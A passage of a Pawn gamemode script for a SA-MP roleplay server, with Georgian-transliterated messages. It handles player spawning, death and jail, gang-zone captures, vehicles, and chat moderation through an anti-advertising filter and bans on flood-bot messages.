    SetPlayerSkills(playerid);
    SetPlayerColor(playerid,0xFFFFFF11);
	SetPVarInt(playerid,"ChangingSkin",0);
	TogglePlayerControllable(playerid,0);
	new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid,x,y,z);
	SetPVarInt(playerid,"Work",0);
	SetPVarInt(playerid,"mafiajob",0);
	SetPVarInt(playerid,"gangjob",0);
	if(GetPVarInt(playerid,"Logined") == 0 || GetPVarInt(playerid,"Joined") == 0) return true;
	if(pData[playerid][pSkin] < 1)
	{
        SetPlayerInterior(playerid,0);
        if(pData[playerid][pSex] == 1) SetPlayerSkin(playerid,7);
        else if(pData[playerid][pSex] == 2) SetPlayerSkin(playerid,12);
        SetPlayerPos(playerid,1481.1748,-1790.0244,156.7533);
        SetPlayerFacingAngle(playerid, 332.4264);
        InterpolateCameraPos(playerid, 1512.130004, -1790.108886, 167.945159, 1474.617675, -1774.856323, 163.368957, 3000);
		InterpolateCameraLookAt(playerid, 1507.310424, -1790.129150, 166.614074, 1476.283325, -1779.302856, 161.802368, 3000);
        SetPlayerVirtualWorld(playerid,playerid);
		TogglePlayerControllable(playerid,0);

		if(pData[playerid][pSex] == 1)
		{
	        TextDrawSetPreviewModel(Statistic[s1SkinPlayer], 293);
			TextDrawSetPreviewModel(Statistic[SkinPlayer1], 22);
			TextDrawSetPreviewModel(Statistic[SkinPlayer2], 3);
			TextDrawSetPreviewModel(Statistic[SkinPlayer3], 43);
			TextDrawSetPreviewModel(Statistic[SkinPlayer4], 47);
			TextDrawSetPreviewModel(Statistic[SkinPlayer5], 101);
		}
		else if(pData[playerid][pSex] == 2)
		{
		    TextDrawSetPreviewModel(Statistic[s1SkinPlayer], 12);
			TextDrawSetPreviewModel(Statistic[SkinPlayer1], 31);
			TextDrawSetPreviewModel(Statistic[SkinPlayer2], 40);
			TextDrawSetPreviewModel(Statistic[SkinPlayer3], 41);
			TextDrawSetPreviewModel(Statistic[SkinPlayer4], 69);
			TextDrawSetPreviewModel(Statistic[SkinPlayer5], 56);
		}

		TextDrawShowForPlayer(playerid,Statistic[s1SkinPlayer]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer1]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer2]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer3]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer4]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer5]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer6]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer7]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer8]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer9]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer10]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer11]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer12]);
		TextDrawShowForPlayer(playerid,Statistic[SkinPlayer13]);
		SelectTextDraw(playerid,0x1E90FFFF);
		return true;
	}
	CheckTir(playerid);CheckTir(playerid);
	if(GetPVarInt(playerid,"Spectating") == 1)
	{
	    SetPlayerHealthEx(playerid,100.0);
		x = GetPVarFloat(playerid,"oldx");
		y = GetPVarFloat(playerid,"oldy");
		z = GetPVarFloat(playerid,"oldz");
		SetPlayerPos(playerid,x,y,z);
		SetPlayerInterior(playerid,GetPVarInt(playerid,"oldint"));
		SetPlayerVirtualWorld(playerid,GetPVarInt(playerid,"oldworld"));
		if(pData[playerid][pFraction]) SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
		else SetPlayerSkin(playerid,pData[playerid][pSkin]);
		SetPVarInt(playerid,"Spectating",0);
		PlayerTextDrawHide(playerid,RECON[playerid]);
		return true;
	}
	if(pData[playerid][pMoney])
	{
		ResetPlayerMoney(playerid);
		GivePlayerMoney(playerid,pData[playerid][pMoney]);
	}
	SetPlayerScore(playerid,pData[playerid][pLevel]);
	if(pData[playerid][pWanted])
	{
		new level = del(pData[playerid][pWanted],WANTED_TIME);
		SetPlayerWantedLevel(playerid,level);
	}
	ApplyAnimation(playerid,"INT_OFFICE","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"BD_FIRE","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"BEACH","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"benchpress","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"BOMBER","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"CAR","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"COP_AMBIENT","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"CRACK","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"CARRY","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"DANCING","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"DEALER","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"FAT","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"FOOD","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"GANGS","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"GHANDS","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"GRAFFITI","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"GRAVEYARD","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"MISC","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"SNM","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"VENDING","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"OTB","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"SMOKING","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"SHOP","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"RIOT","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"CAR_CHAT","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"CHAINSAW","null",0.0,0,0,0,0,0);
	ApplyAnimation(playerid,"CAMERA","null",0.0,0,0,0,0,0);
	if(pData[playerid][pPrison] == 10)
	{
	    SetPlayerInterior(playerid,1);
	    SetPlayerVirtualWorld(playerid,1);
		SetPlayerPos(playerid,-315.0161,-267.5797,1082.7289);
		SetPlayerSkin(playerid,pData[playerid][pSkin]);
		TogglePlayerControllable(playerid,0);
		SetTimerEx("Unfreez",2000,false,"i",playerid);
		SetPVarInt(playerid,"IsInKamera",2);
		return true;
	}
	if(pData[playerid][pBolnica] > 0)
	{
	    if(pData[playerid][pBolnica] == 5)
	 	{
	 	    new fractionid = pData[playerid][pFraction]-1;
	 	    pData[playerid][pBolnica] = 0;
	 	    SetPlayerVirtualWorld(playerid,gFractionSpawnData[fractionid][1]);
			SetPlayerInterior(playerid,gFractionSpawnData[fractionid][0]);
			SetPlayerPos(playerid,gFractionSpawnC[fractionid][0],gFractionSpawnC[fractionid][1],gFractionSpawnC[fractionid][2]);
			SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
			SetCameraBehindPlayer(playerid);
			SetPlayerColor(playerid,gFractionColor[fractionid]);
			TogglePlayerControllable(playerid,0);
			SetTimerEx("Unfreez",2000,false,"i",playerid);
			SetPlayerHealthEx(playerid,10.0);
	 	}
	 	else
	 	{
			new Float:c[4][4] = {
			{144.8432,-217.7581,922.9600,186.5591},
			{141.3732,-218.4870,922.9600,11.7163},
			{119.5667,-225.6949,922.9600,20.3323},
			{123.7014,-223.6950,922.9600,181.9357}
			};
			new f = RandomEx(0,4);
			SetPlayerVirtualWorld(playerid,pData[playerid][pBolnica]);
			SetPlayerInterior(playerid,1);
			SetPVarInt(playerid,"InHospital",1);
			SetPlayerPos(playerid,c[f][0],c[f][1],c[f][2]);
			SetPlayerFacingAngle(playerid,c[f][3]);
			if(pData[playerid][pFraction]) SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
			else SetPlayerSkin(playerid,pData[playerid][pSkin]);
			TogglePlayerControllable(playerid,0);
			SetTimerEx("Unfreez",2000,false,"i",playerid);
			SetPlayerHealthEx(playerid,10.0);
		}
	}
	else if(pData[playerid][pOtel] && pData[playerid][pSpawn] == 3)
	{
	    SetPlayerPos(playerid,-2158.6987,642.1813,1057.5938);
		SetPlayerInterior(playerid, 1);
		SetPlayerVirtualWorld(playerid,playerid);
		if(pData[playerid][pFraction]) SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
		else SetPlayerSkin(playerid,pData[playerid][pSkin]);
		if(pData[playerid][pFraction]) SetPlayerColor(playerid,gFractionColor[pData[playerid][pFraction] - 1]);
	}
	else if(pData[playerid][pHouse] && pData[playerid][pSpawn] <= 1)
	{
		SetPlayerVirtualWorld(playerid,pData[playerid][pHouse]);
		new interior, Float:r;
		new houseid = pData[playerid][pHouse] - 1;
		new hint = gHouses[houseid][houseHint];
		if(pData[playerid][pFraction])
		{
			if(gHouses[houseid][houseImprove][1])
   			{
   			    if(GetString(Name2(playerid),gHouses[houseid][houseOwner])) SetPlayerSkin(playerid,pData[playerid][pSkin]);
   			    else SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
		 	}
			else SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
		}
		else SetPlayerSkin(playerid,pData[playerid][pSkin]);
		pTemp[playerid][pSelectedHouseID] = houseid;
		x = gHints[hint][hintSX];
		y = gHints[hint][hintSY];
		z = gHints[hint][hintSZ];
		r = gHints[hint][hintSR];
		interior = gHints[hint][hintInterior];
		SetPlayerInterior(playerid,interior);
		SetPlayerPos(playerid,x,y,z);
		SetPlayerFacingAngle(playerid,r);
		SetPVarInt(playerid,"IsInHouse",1);
		if(pData[playerid][pFraction]) SetPlayerColor(playerid,gFractionColor[pData[playerid][pFraction] - 1]);
	}
	else if(pData[playerid][pFraction])
	{
		new fractionid = pData[playerid][pFraction]-1;
		if(pData[playerid][pSubfraction])
		{
			new frid;
			frid = GetSubfractionID(fractionid);
			new subid = pData[playerid][pSubfraction] - 1;
			SetPlayerInterior(playerid,gSubfractionSpawnData[frid][subid][0]);
			SetPlayerVirtualWorld(playerid,gSubfractionSpawnData[frid][subid][1]);
			SetPlayerPos(playerid,gSubfractionSpawnC[frid][subid][0],gSubfractionSpawnC[frid][subid][1],gSubfractionSpawnC[frid][subid][2]);
			SetPlayerFacingAngle(playerid,gSubfractionSpawnC[frid][subid][3]);
		}
		else
		{
			SetPlayerVirtualWorld(playerid,gFractionSpawnData[fractionid][1]);
			SetPlayerInterior(playerid,gFractionSpawnData[fractionid][0]);
			SetPlayerPos(playerid,gFractionSpawnC[fractionid][0],gFractionSpawnC[fractionid][1],gFractionSpawnC[fractionid][2]);
		}
		SetPlayerSkin(playerid,pData[playerid][pFractionSkin]);
		SetCameraBehindPlayer(playerid);
		SetPlayerColor(playerid,gFractionColor[fractionid]);
		if(fractionid == 1) SetPVarInt(playerid,"InHospital",1);
		TogglePlayerControllable(playerid,0);
		SetTimerEx("Unfreez",2000,false,"i",playerid);
	}
	else
	{
	    SetPlayerSkin(playerid,pData[playerid][pSkin]);
	    SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid, 0);
		new rands = random(sizeof(RandomSpawns));
		SetPlayerPos(playerid, RandomSpawns[rands][0], RandomSpawns[rands][1], RandomSpawns[rands][2]);
		SetPlayerFacingAngle(playerid, RandomSpawns[rands][3]);
	}
	new gun[128];
	GetPVarString(playerid,"mysqlgun",gun,128);
	DeletePVar(playerid,"mysqlgun");
	if(strlen(gun))
	{
		new guns[6],ammos[6],datas[2][56];
		explode(datas,gun,":");
		//printf("%s:%s",datas[0],datas[1]);
		sscanf(datas[0],"p<|>a<i>[6]",guns);
		sscanf(datas[1],"p<|>a<i>[6]",ammos);
		for(new i;i<6;i++)
		{
			GivePlayerWeaponEx(playerid,guns[i],ammos[i]);
		}
	}
	if(IsAMafia(playerid) && IsStrela == 1) CaptureUpdD(playerid);
   	if(pData[playerid][pFraction] < 3 || pData[playerid][pFraction] > 7 && captures > 0) GzChecker();
	return true;
}
public OnPlayerDeath(playerid, killerid, reason)
{
	ResetPlayerWeaponsEx(playerid);
	pData[playerid][pHealth] = 100;
	if(IsAGang(playerid)) pData[playerid][pBolnica] = 5;
	else
	{
	    new Float:x, Float:y, Float:z;
		GetPlayerPos(playerid,x,y,z);
		if(x < 0) pData[playerid][pBolnica] = 2;
		else if(y > 100.0) pData[playerid][pBolnica] = 3;
		else pData[playerid][pBolnica] = 1;
		UpdatePlayerData(playerid,"Bolnica",pData[playerid][pBolnica]);
	}
	CheckTir(playerid);
	if(killerid != INVALID_PLAYER_ID)
	{
		if(pData[playerid][pWanted] && pTemp[playerid][pCuffee] == playerid)
		{
			if(IsACop(killerid) && pData[killerid][pSubfraction] > 0)
			{
				new id = playerid;
				new level = del(pData[playerid][pWanted],WANTED_TIME);
				new time = level * JAIL_QUATE;
				new camid = pData[killerid][pSubfraction] - 1;
				new cuffer = pTemp[id][pCuffer];
				SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
				RemovePlayerAttachedObject(id,0);
				pTemp[id][pCuffer] = INVALID_PLAYER_ID;
				pTemp[id][pCuffee] = INVALID_PLAYER_ID;
				pTemp[cuffer][pCuffee] = INVALID_PLAYER_ID;
				pTemp[cuffer][pCuffer] = INVALID_PLAYER_ID;
				if(cuffer != killerid) SendClientMessage(cuffer,CINFO,"Dapatimrebuli Xart Policielis Mkvlelobistvis");
				SFCM(killerid,CWHITE,"%s {"#cINFO"}Shen Chagsves KPZ-Ze %d Wutit",Name2(id),time);
				pData[id][pJail] = time;
				pData[id][pPrison] = camid;
				pData[id][pWanted] = 0;
				SetPlayerWantedLevel(id,0);
				new query[180];
				format(query,sizeof(query),"UPDATE `members` SET `jail` = '%d', prison = '%d', wanted = '0' WHERE `nickname` = '%s'",pData[id][pJail],pData[id][pPrison],Name2(id));
				mysql_empty(mysql, query);
				if(mysql_errno()) SendClientMessage(playerid,CRED,"Ошибка MySQL");
				pData[playerid][pBolnica] = 0;
			}
		}
	}
	if(pTemp[playerid][pCuffee] == playerid)
	{
		new id = playerid;
		new cuffer = pTemp[id][pCuffer];
		SetPlayerSpecialAction(id,SPECIAL_ACTION_NONE);
		RemovePlayerAttachedObject(id,0);
		pTemp[id][pCuffer] = INVALID_PLAYER_ID;
		pTemp[id][pCuffee] = INVALID_PLAYER_ID;
		pTemp[cuffer][pCuffee] = INVALID_PLAYER_ID;
		pTemp[cuffer][pCuffer] = INVALID_PLAYER_ID;
		SendClientMessage(cuffer,CINFO,"Dapatimrebuli Mokvda");
	}
 	if(GetPVarInt(playerid,"takegun") == 1) return SetPVarInt(playerid,"takegun",0);
	if(killerid != INVALID_PLAYER_ID)
	{
	    new i = CaptFight;
        if(ZoneOnBattle[i] == 1)
        {
            if(pData[killerid][pFraction] == GZInfo[i][gNapad] && pData[killerid][pFraction] != pData[playerid][pFraction] ||
		    pData[killerid][pFraction] == GZInfo[i][gFrakVlad] && pData[killerid][pFraction] != pData[playerid][pFraction])
		    {
		        if(pData[playerid][pFraction] == GZInfo[i][gNapad] || pData[playerid][pFraction] == GZInfo[i][gFrakVlad])
		        {
	                new string[80];
	                format(string,sizeof(string),"[F] %s[%i] Iqna Mokluli Chxubshi.",Name2(playerid),playerid);
					SendFMes(pData[playerid][pFraction],0xB9FF19FF,string);
	                CountOnZone[pData[killerid][pFraction]] ++;
	                GzChecker();
		        }
		    }
		    if(CountOnZone[GZInfo[i][gNapad]] >= 16)
			{
			    CountOnZone[GZInfo[i][gFrakVlad]] = 0;
				CountOnZone[GZInfo[i][gNapad]] = 0;
				SendFMes(GZInfo[i][gNapad], 0x00B953AA,"Tqven Daamyaret Kontroli Axal Teritoriaze");
				SendFMes(GZInfo[i][gFrakVlad], 0xC56565AA,"Tqven Dakarget Kontroli Tqvens Teritoriaze");
				GZInfo[i][gFrakVlad] = GZInfo[i][gNapad];
				GZInfo[i][gNapad] = 0;
				for(new idxf=0, y=0; idxf<cvector_size(players); idxf++)
				{
				    y = cvector_get(players, idxf);
					if(pData[y][pFraction] == GZInfo[i][gNapad] || pData[y][pFraction] == GZInfo[i][gFrakVlad])
					{
      					CaptureOn[y] = 0;
						PlayerTextDrawHide(y, CaptureTime[y]);
					}
				}
				captures = 0;
				ZoneOnBattle[i] = 0;
				GangZoneStopFlashForAll(GZInfo[i][gID]);
				GangZoneHideForAll(GZInfo[i][gID]);
				GangZoneShowForAll(GZInfo[i][gID],GetGangZoneColor(i));
				SaveGZ(i+1);
			}
			if(CountOnZone[GZInfo[i][gFrakVlad]] >= 16)
			{
			    SendFMes(GZInfo[i][gFrakVlad],0x00B953AA,"Shen Sheinarchune Sheni Teritoria");
				SendFMes(GZInfo[i][gNapad],0xC56565AA,"Shen Ver Daipyari Axali Teritoria");
				CountOnZone[GZInfo[i][gFrakVlad]] = 0;
				CountOnZone[GZInfo[i][gNapad]] = 0;
				for(new idxf=0, y=0; idxf<cvector_size(players); idxf++)
				{
				    y = cvector_get(players, idxf);
					if(pData[y][pFraction] == GZInfo[i][gNapad] || pData[y][pFraction] == GZInfo[i][gFrakVlad])
					{
      					CaptureOn[y] = 0;
						PlayerTextDrawHide(y, CaptureTime[y]);
					}
				}
				captures = 0;
				ZoneOnBattle[i] = 0;
				GangZoneStopFlashForAll(GZInfo[i][gID]);
				GangZoneHideForAll(GZInfo[i][gID]);
				GangZoneShowForAll(GZInfo[i][gID],GetGangZoneColor(i));
				SaveGZ(i+1);
			}
        }
	    if(IsStrela == 1)
	    {
	        if(pData[killerid][pFraction] == pData[playerid][pFraction]) return true;
		    new bandkiller,bandkill;
			if(pData[killerid][pFraction] !=0) bandkiller = pData[killerid][pFraction];
			else bandkiller = pData[killerid][pFraction];
			if(pData[playerid][pFraction] !=0) bandkill = pData[playerid][pFraction];
			else bandkill = pData[playerid][pFraction];
			if(GangInfoD[bandkiller][capture] && GangInfoD[bandkill][capture] == 1)
			{
				if(GangInfoD[bandkiller][captureid] == GangInfoD[bandkill][captureid])
				{
					GangInfoD[bandkiller][score] = GangInfoD[bandkiller][score]+1;
					CaptureUpdD(bandkiller);
					GzCheckD();
				}
			}
		}
    }
   	return true;
}

public OnVehicleSpawn(vehicleid)
{
	GetVehiclePos(vehicleid, gVehicles[vehicleid - 1][vX], gVehicles[vehicleid - 1][vY], gVehicles[vehicleid - 1][vZ]);
	GetVehicleZAngle(vehicleid, gVehicles[vehicleid -1][vA]);
	if(vehicleid >= aTaxi[0] && vehicleid <= aTaxi[1])
	{
		if(ToggleLock(vehicleid)) ToggleLock(vehicleid);
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(pTemp[i][pTaxiID] == vehicleid)
			{
				if(pTemp[i][pTaxi3DText] != Text3D:INVALID_3DTEXT_ID) DestroyDynamic3DTextLabelEx(pTemp[i][pTaxi3DText]);
				pTemp[i][pTaxiID] = INVALID_VEHICLE_ID;
				pTemp[i][pTaxiPrice] = 0;
				pTemp[i][pTaxiTurn][0] = INVALID_PLAYER_ID;
				pTemp[i][pTaxiTurn][1] = INVALID_PLAYER_ID;
				SendClientMessage(i,CGRAY,"Avtomobili Chaixsna Buqsiridan");
				break;
			}
		}
	}
	if(vehicleid >= aMech[0] && vehicleid <= aMech[1])
	{
		if(ToggleLock(vehicleid)) ToggleLock(vehicleid);
		for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		{
  			i = cvector_get(players, idxf);
			if(pTemp[i][pMechID] == vehicleid)
			{
				pTemp[i][pMechID] = INVALID_VEHICLE_ID;
				SendClientMessage(i,CGRAY,"Avtomobili Chaixsna Buqsiridan");
			}
		}
	}
	if(gVehicleGun[vehicleid][vGunLoading] || gVehicleGun[vehicleid][vGunUnloading])
	{
		gVehicleGun[vehicleid][vGunGunAmount] = 0;
		gVehicleGun[vehicleid][vGunAmmo] = 0;
		gVehicleGun[vehicleid][vGunLoading] = false;
		gVehicleGun[vehicleid][vGunUnloading] = false;
		if(IsValid3DTextLabel(gVehicleGun[vehicleid][vGunText])) DestroyDynamic3DTextLabelEx(gVehicleGun[vehicleid][vGunText]);
		DestroyDynamicArea(gVehicleGun[vehicleid][vGunArea]);
		DestroyDynamicPickup(gVehicleGun[vehicleid][vGunPickup]);
		gVehicleGun[vehicleid][vGunArea] = 0;
		gVehicleGun[vehicleid][vGunPickup] = 0;
	}
	if(gVehicles[vehicleid-1][vColor][0])
	{
		ChangeVehicleColor(vehicleid,gVehicles[vehicleid-1][vColor][0]-1,gVehicles[vehicleid-1][vColor][1]-1);
	}
	return true;
}

public OnVehicleDeath(vehicleid, killerid)
{
	gGangRespawnCar = 1;
	if(killerid != INVALID_PLAYER_ID && !IsPlayerConnected(killerid)) return false;
	new Float: pos[3];
	GetVehicleRotation(vehicleid, pos[0], pos[1], pos[2]);
	if(!IsKicked(killerid) && (pos[1] < 90 && pos[1] > -90) && gVehicleDriver[vehicleid-1] == INVALID_PLAYER_ID && GetPVarInt(killerid, "lastveh") != vehicleid && killerid != INVALID_PLAYER_ID)
	{
		SendClientMessage(killerid,0xB85A1CFF,"Shen Gaikike, Chetis Gamokenebistvis. (#0066)");
		NewKick(killerid);
		return false;
	}
	DeletePVar(killerid, "lastveh");
	if(vehicleid >= aTaxi[0] && vehicleid <= aTaxi[1])
	{
		new playerid = gVehicleDriver[vehicleid-1];
		if(playerid != INVALID_PLAYER_ID)
		{
			SendClientMessage(playerid,CRED,"Taqsi Ganadgurebulia");
			if(IsValid3DTextLabel(pTemp[playerid][pTaxi3DText])) DestroyDynamic3DTextLabelEx(pTemp[playerid][pTaxi3DText]);
			pTemp[playerid][pTaxiID] = INVALID_VEHICLE_ID;
			pTemp[playerid][pTaxiPrice] = 0;
			pTemp[playerid][pTaxi3DText] = Text3D:INVALID_3DTEXT_ID;
			pTemp[playerid][pTaxiPass] = INVALID_PLAYER_ID;
		}
	}
	return true;
}
stock split(const strsrc[], strdest[][], delimiter)
{
    new i, li, aNum, len;
    while(i <= strlen(strsrc))
    {
        if(strsrc[i] == delimiter || i == strlen(strsrc))
        {
            len = strmid(strdest[aNum], strsrc, li, i, 128);
            strdest[aNum][len] = 0;
            li = i+1;
            aNum++;
        }
        i++;
    }
    return true;
}
stock Proverka(playerid, textt[])
{
	new ip[32];
	GetPlayerIp(playerid,ip,24);
	pData[playerid][pMut] = 10;
	format(mes, sizeof(mes), "Echvmitanili Areklamebs Ragacas: %s",textt);
	AdminChat(COLOR_LIGHTRED,mes);
	format(mes, sizeof(mes), "Echvmintanili: %s[%d] | IP: %s",Name2(playerid),playerid, ip);
	AdminChat(COLOR_LIGHTRED,mes);
	SendClientMessage(playerid, COLOR_LIGHTRED, "Shen Dagedo Mute 10-Wutit");
	return false;
}
new WebSites[][] ={"Admins Mogcem",".com","samp-vl","X3N0RM","Gavidet Serveridan","Axali Serveri Gaixsna","Chem Serverze","Deda Movtyan Sheni","G R L","Gadavidet Im Serverze","Yle Serveria","Damimate Skype","7777",".su","Gaicema Puli","Axali IP","Gaicema LVL",":7825","77.","GRL","Axali RP","Yle Adminebi","семьдесят",".171","Ultra","Admin Mogcem","Sxva Serveri","U l tr a","Leaders Mogcem"};
stock CheckString(string[])
{
    for(new i = 0;i<sizeof(WebSites);i++)
    {
        if(strfind(string,WebSites[i],true) != -1) return true;
    }
    return false;
}
new delimiters[]={'.', ' ', ',', '*', '/', ';', '\\', '|'};
stock IsIP(const str[])
{
    for(new cIP[4]; cIP[0] != strlen(str)+1; cIP[0]++)
    {
        switch(str[cIP[0]])
        {
            case '.', ' ', ':', ',', '*', '/', ';', '\\', '|' : continue;
            case '0' .. '9': cIP[1]++;
        }
        if(cIP[1] ==1){ cIP[2] = cIP[0];}
        if(cIP[1] >= 8)
        {
            new strx[16]; new l[4][4];
            cIP[3] = cIP[0]+8; strmid(strx,str,cIP[2],cIP[3],16);
            for(new i =strlen(strx);i>8;i--)
            {
                switch(strx[i])
                {
                    case '0' .. '9','.', ' ', ':', ',', '*', '/', ';', '\\', '|': continue;
                    default: strx[i] =0;
                }
            }
            for(new i =0;i<sizeof(delimiters);i++)
            {
                split(strx,l,delimiters[i]);
                if(strlen(l[0]) == 1 ||strlen(l[1]) == 1 ||strlen(l[2]) == 1 ||strlen(l[3]) == 1){ continue; }
                if(strlen(l[0]) >3 ||strlen(l[1]) >3 ||strlen(l[2]) >3){ continue; }
                else { return true; }
            }
        }
    }
    return false;
}
public OnPlayerUpdate(playerid)
{
    new pip[16];
	GetPlayerIp(playerid, pip, sizeof(pip));
	if(strcmp(pip, "178.134.91.84", false)) //
	if(strcmp(pip, "", false)) //
	if(strcmp(pip, "", false)) //
	if(strcmp(pip, "", false)) //
	if(strcmp(pip, "", false)) //
	if(strcmp(pip, "", false)) //Tavisufalia
	if(strcmp(pip, "", false)) //Tavisufalia
	if(strcmp(pip, "", false)) //Tavisufalia
	{
		if(pData[playerid][pAdmin] > 0)
		{
 			pData[playerid][pAdmin] = 0;
   			SendClientMessage(playerid, CRED, "Ar Xar Administrtor !");
    	}
	}
    if (GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
    {
    	new Float:vec[3];
     	GetPlayerCameraFrontVector(playerid, vec[0], vec[1], vec[2]);
      	new bool:possible_crasher = false;
 	   	for (new i = 0; !possible_crasher && i < sizeof(vec); i++)
        if (floatabs(vec[i]) > 10.0)
        possible_crasher = true;
		if (possible_crasher)
  		return 0; //do not send fake data, prevents crash
    }
    if(GetPVarInt(playerid,"pAFK") > 0) SetPVarInt(playerid,"pAFK",0);
    if(PlayerTir[playerid] != -1)
	{
	    new tir = PlayerTir[playerid];
	    if(IsPlayerInRangeOfPoint(playerid, 2.0, TirInfo[tir][tirPos][0], TirInfo[tir][tirPos][1], TirInfo[tir][tirPos][2]))
	    {
	        new ammo = GetPlayerAmmo(playerid);
	        if(TargetGo[tir])
	        {
	            new Float:X, Float:Y, Float:Z;
				GetDynamicObjectPos(Target_Object[tir], X, Y, Z);
		        SetPlayerArmedWeapon(playerid, TirGun[playerid]);
		        if(ammo < TirAmmo[playerid])
		        {
		            if(GetPlayerWeapon(playerid) == TirGun[playerid])
		            {
		                if(IsPlayerAimingAt(playerid, X-0.28, Y, Z+1.58, 0.18))
					    {
		  					HitCount[playerid][0] += (TirAmmo[playerid] - ammo);
						    if(HitCount[playerid][0] >= TargetFireCount(TirGun[playerid]))
						    {
						        TextDrawShowForPlayer(playerid, TirDraw[0]);
						        HitPoint[playerid][0] = true;
						        HitCount[playerid][0] = 0;
						        CheckHit(playerid);
						    }
					    }
					    else if(IsPlayerAimingAt(playerid, X-0.085, Y, Z+0.77, 0.2))
					    {
		  					HitCount[playerid][1] += (TirAmmo[playerid] - ammo);
						    if(HitCount[playerid][1] >= TargetFireCount(TirGun[playerid]))
						    {
						        TextDrawShowForPlayer(playerid, TirDraw[1]);
						        HitPoint[playerid][1] = true;
						        HitCount[playerid][1] = 0;
						        CheckHit(playerid);
						    }
					    }
					    else if(IsPlayerAimingAt(playerid, X+0.49, Y, Z+0.77, 0.2))
					    {
		  					HitCount[playerid][2] += (TirAmmo[playerid] - ammo);
						    if(HitCount[playerid][2] >= TargetFireCount(TirGun[playerid]))
						    {
						        TextDrawShowForPlayer(playerid, TirDraw[2]);
						        HitPoint[playerid][2] = true;
						        HitCount[playerid][2] = 0;
						        CheckHit(playerid);
						    }
					    }
					    else if(IsPlayerAimingAt(playerid, X-0.1, Y, Z+0.22, 0.2))
					    {
		  					HitCount[playerid][3] += (TirAmmo[playerid] - ammo);
						    if(HitCount[playerid][3] >= TargetFireCount(TirGun[playerid]))
						    {
						        TextDrawShowForPlayer(playerid, TirDraw[3]);
						        HitPoint[playerid][3] = true;
						        HitCount[playerid][3] = 0;
						        CheckHit(playerid);
						    }
					    }
					    else if(IsPlayerAimingAt(playerid, X+0.52, Y, Z+0.2, 0.2))
					    {
		  					HitCount[playerid][4] += (TirAmmo[playerid] - ammo);
						    if(HitCount[playerid][4] >= TargetFireCount(TirGun[playerid]))
						    {
						        TextDrawShowForPlayer(playerid, TirDraw[4]);
						        HitPoint[playerid][4] = true;
						        HitCount[playerid][4] = 0;
						        CheckHit(playerid);
						    }
					    }
		            }
		        }
	        }
	        else
			{
                if(StartCount[playerid] > 1) SetPlayerArmedWeapon(playerid, 0);
	        }
	        TirAmmo[playerid] = ammo;
	    }
	    else CheckTir(playerid);
    }
	return true;
}
public OnPlayerText(playerid, text[])
{
    if(strfind(text,"Zeta-Hack.ru PizDoS Bot by AlexDrift",true) == 0) return BanEx(playerid,"Warning-Budko: Flood Pack'ets (2)");
    if(strfind(text,"[CaypDos]: Автор Caypen",true) == 0) return BanEx(playerid,"Warning-Budko: Flood Pack'ets");
    if(GetPVarInt(playerid,"Logined") == 0) return Kick(playerid);
 	if(strlen(text) < 1 || strlen(text) > 70)
	{
		SendClientMessage(playerid,CGRAY,"Texti Dzalian Grdzelia Dawere Upro Mokled.");
		return false;
	}
	if(pData[playerid][pMut])
	{
		SendClientMessage(playerid,CGRAY,"Tqven Dagedot Mute.");
		return false;
	}
	if(GetPVarInt(playerid,"yrok") != 0) return false;
    if(IsIP(text) || CheckString(text)) return Proverka(playerid, text);
    if(strfind(text,"админ",true) != -1 || strfind(text,"afk",true) != -1 ||  strfind(text,"афк",true) != -1\
	|| strfind(text,"gta",true) != -1  || strfind(text,"samp",true) != -1 || strfind(text,"читер",true) != -1 || strfind(text,"/",true) != -1\
	|| strfind(text,"server",true) != -1 || strfind(text,"лидер",true) != -1 || strfind(text,"сервер",true) != -1\
 	|| strfind(text,"cheat",true) != -1 || strfind(text,"admin",true) != -1 || strfind(text,"ранг",true) != -1)
	{
